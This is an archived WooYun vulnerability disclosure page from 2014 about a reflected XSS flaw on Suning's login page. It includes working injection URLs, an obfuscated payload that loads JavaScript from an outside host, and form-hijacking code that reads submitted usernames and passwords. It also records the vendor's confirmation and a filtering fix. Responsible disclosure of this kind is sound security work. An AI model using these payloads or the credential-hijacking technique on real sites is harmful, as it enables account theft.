@@ -1,0 +1,202 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		苏宁易购某分站XSS漏洞可用于获取账号密码（xss劫持表单技巧）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		苏宁易购某分站XSS漏洞可用于获取账号密码（xss劫持表单技巧）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/龟兔赛跑">龟兔赛跑</a> 
+</li><li>提交时间：		2014-03-11 23:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-03-11：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-03-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-03-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-04-01：	细节向普通白帽子公开<br/>
+									2014-04-11：	细节向实习白帽子公开<br/>
+									2014-04-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">苏宁易购某分站反射型XSS漏洞可用于获取账号密码</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">苏宁易购登录页面存在反射型XSS漏洞，具体URL为：<br />
+<br />
+https://passport.suning.com/ids/login?service=https%253A%252F%252Fmember.suning.com%252Fwebapp%252Fwcs%252Fstores%252Fauth%253FtargetUrl%253Dhttps%25253A%25252F%25252Fwww.suning.com%25252Fwebapp%25252Fwcs%25252Fstores%25252Fservlet%25252FSNTrustLogonInterceptorCmd%25253FstoreId%25253D10052%252526catalogId%25253D10051%252526app_id%25253D1007%252526target_url%25253Dhttps%25253A%25252F%25252Fpay.suning.com%25252Fepp-portal%25252Fuseraccount%25252Fuser-account%252521initUserAccount.action%252526trust_sn%25253D4a41a43b5d79408ea974a80b25f966fb&amp;method=GET&amp;loginTheme=b2c<br />
+<br />
+<br />
+<br />
+虽然对loginTheme进行了一定的过滤，但是还是允许&lt;a&gt; &lt;img&gt;等html tag.<br />
+<br />
+最简单的测试为：<br />
+<br />
+https://passport.suning.com/ids/login?service=https%253A%252F%252Fmember.suning.com%252Fwebapp%252Fwcs%252Fstores%252Fauth%253FtargetUrl%253Dhttps%25253A%25252F%25252Fwww.suning.com%25252Fwebapp%25252Fwcs%25252Fstores%25252Fservlet%25252FSNTrustLogonInterceptorCmd%25253FstoreId%25253D10052%252526catalogId%25253D10051%252526app_id%25253D1007%252526target_url%25253Dhttps%25253A%25252F%25252Fpay.suning.com%25252Fepp-portal%25252Fuseraccount%25252Fuser-account%252521initUserAccount.action%252526trust_sn%25253D4a41a43b5d79408ea974a80b25f966fb&amp;method=GET&amp;loginTheme=b2c%22%3E%3Cimg%20src=%22test<br />
+<br />
+可以看到会员登录框上出现一个image:<br />
+<br />
+</p><p class="detail"><a href="../images/111816593d28eb6f35fdaa046e76d6e83256817b.png" target="_blank"><img src="../images/111816593d28eb6f35fdaa046e76d6e83256817b.png" alt="suning2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+接下来就是如何构建注入代码加载JS文件，以及如何bypass浏览器的xss filter, 目前只是在FireFox上实现了加载JS，IE和chrome上还没有加载成功,相信各位大牛一定能找到方法。<br />
+<br />
+<br />
+<br />
+加载的js的代码为：<br />
+<br />
+</p><pre><code>$(&quot;form&quot;).submit(function( event ) {<br />
+	  alert($(&quot;input[name=&#039;username&#039;]&quot;).val() + &#039;=&#039; + $(&quot;input[name=&#039;password&#039;]&quot;).val());<br />
+});</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+FireFox上访问的URL构建为（javascript:eval + String.fromCharCode）：<br />
+<br />
+https://passport.suning.com/ids/login?service=https%253A%252F%252Fmember.suning.com%252Fwebapp%252Fwcs%252Fstores%252Fauth%253FtargetUrl%253Dhttps%25253A%25252F%25252Fwww.suning.com%25252Fwebapp%25252Fwcs%25252Fstores%25252Fservlet%25252FSNTrustLogonInterceptorCmd%25253FstoreId%25253D10052%252526catalogId%25253D10051%252526app_id%25253D1007%252526target_url%25253Dhttps%25253A%25252F%25252Fpay.suning.com%25252Fepp-portal%25252Fuseraccount%25252Fuser-account%252521initUserAccount.action%252526trust_sn%25253D4a41a43b5d79408ea974a80b25f966fb&amp;method=GET&amp;loginTheme=b2c%22%3E%3Ca%20href%3D%22javascript%3Aeval%28String.fromCharCode%2895,108,111,97,100,74,115,40,34,104,116,116,112,115,58,47,47,111,119,97,102,112,101,46,115,105,110,97,97,112,112,46,99,111,109,47,115,116,97,116,105,99,47,116,101,115,116,46,106,115,34,41%29%29;%22%20id=%22a<br />
+<br />
+<br />
+<br />
+这里是注入&lt;a&gt;, 用户点击输入输入框时会加载js，提交的时候就能拿到username和password了。<br />
+<br />
+<br />
+<br />
+如何利用就不用我讲了吧。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/11181110045cbfab6323a2171071b0ad33466b5f.png" target="_blank"><img src="../images/11181110045cbfab6323a2171071b0ad33466b5f.png" alt="suning.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤loginTheme参数 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/龟兔赛跑" title="龟兔赛跑">龟兔赛跑</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-053383" title="苏宁易购某分站XSS漏洞可用于获取账号密码（xss劫持表单技巧）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-03-12 09:00</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对苏宁易购安全的关注，先确定，再安排修复，谢谢。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="53383";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
